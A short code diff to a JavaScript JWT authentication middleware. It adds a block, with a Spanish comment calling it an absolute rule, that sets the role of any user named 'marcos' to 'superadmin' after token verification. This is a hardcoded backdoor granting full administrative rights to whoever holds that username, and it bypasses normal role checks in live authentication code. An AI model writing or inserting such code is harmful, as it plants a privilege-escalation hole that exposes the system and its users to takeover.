@@ -16,6 +16,12 @@ export const auth = (req, res, next) => {
     try {
         const decoded = jwt.verify(token, SECRET);
         req.user = decoded;
+        
+        // Regla absoluta: Si el usuario es Marcos, forzar su rol a superadmin en el backend
+        if (req.user.username && req.user.username.toLowerCase() === 'marcos') {
+            req.user.role = 'superadmin';
+        }
+
         next();
     } catch (error) {
         return res.status(401).json({ error: 'Token inválido o expirado.' });
